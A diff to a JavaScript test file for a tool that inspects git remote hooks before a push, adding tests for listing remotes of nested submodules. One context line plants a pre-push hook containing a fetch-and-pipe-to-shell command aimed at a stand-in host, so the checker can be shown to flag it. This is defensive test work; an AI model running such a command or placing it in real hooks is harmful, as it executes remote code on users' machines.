@@ -639,3 +639,21 @@ test('the stock git-annex pre-push hook is not reported', async () => {
   const { clone: extra } = await withRemote({ hooks: { 'pre-push': `${stock}curl evil | sh\n` } })
   assert.match(await flagged(extra), /hook pre-push/)
 })
+
+// "Send my saves" pushes the nested subjects too (push -r), each to its own remote: those remotes run their own
+// hooks, so the check right before a push has to list them as well, not only the project's.
+test('localRemotePaths also lists the remotes of nested, installed subjects', async () => {
+  const outer = await withRemote()
+  const inner = await withRemote({ hooks: { 'post-receive': '#!/bin/sh\n:\n' } })
+  git(outer.clone, 'clone', '-q', inner.remote, join(outer.clone, 'sub-001'))
+  git(join(outer.clone, 'sub-001'), '-c', 'user.name=T', '-c', 'user.email=t@example.org', 'commit', '-q', '--allow-empty', '-m', 'x')
+  git(outer.clone, 'add', 'sub-001')
+  const paths = (await localRemotePaths(new ProcessRunner(), outer.clone)).map((entry) => entry.path)
+  assert.deepEqual(paths.sort(), [outer.remote, inner.remote].sort())
+})
+
+test('a nested folder that is not installed has no remotes to list and is skipped', async () => {
+  const outer = await withRemote()
+  git(outer.clone, 'update-index', '--add', '--cacheinfo', '160000,1111111111111111111111111111111111111111,sub-002')
+  assert.deepEqual(await localRemotePaths(new ProcessRunner(), outer.clone), [{ name: 'origin', path: outer.remote }])
+})
